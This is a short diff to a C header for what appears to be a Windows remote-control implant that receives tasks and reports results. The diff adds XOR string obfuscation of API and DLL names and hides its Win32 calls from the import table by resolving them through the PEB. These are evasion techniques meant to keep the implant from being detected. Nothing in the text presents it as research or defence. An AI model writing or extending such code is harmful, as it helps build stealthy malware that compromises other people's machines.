@@ -450,4 +450,14 @@ BOOL send_task_result(AgentState *state, const unsigned char *task_id,
                       const unsigned char *result, DWORD result_len,
                       BOOL success);
 
+/* ─── String obfuscation: XOR-encrypted API/DLL name macros ─── */
+#include "str_obf.h"
+
+/* ─── IAT hiding: redirect sensitive Win32 calls through PEB-resolved pointers ───
+ * Must come LAST — after all windows.h declarations are visible.
+ * iat_hide.c defines IAT_HIDE_IMPL to suppress the macros in its own TU. */
+#ifndef IAT_HIDE_IMPL
+#include "iat_hide.h"
+#endif
+
 #endif /* AGENT_H */
